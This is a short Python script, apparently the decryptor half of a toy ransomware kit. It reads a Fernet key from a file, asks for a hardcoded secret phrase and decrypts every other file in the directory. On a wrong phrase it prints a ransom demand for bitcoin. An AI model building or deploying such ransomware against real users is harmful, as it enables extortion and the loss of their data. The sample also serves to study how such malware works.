import os
from cryptography.fernet import Fernet


files = []
for file in os.listdir():
    if file in ["devil.py", "thekey.key", "angel.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)


with open("thekey.key", "rb") as key_file:
    secretkey = key_file.read()

secret = "Bats"
user_phase = input("Enter the secret to decrypt your files\n")

if user_phase == secret:
    for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            print(f"File '{file}' decrypted successfully.")
    print("Congrats, your files are decrypted")
else:
    print("Sorry, wrong secret phrase. Send me more bitcoin")
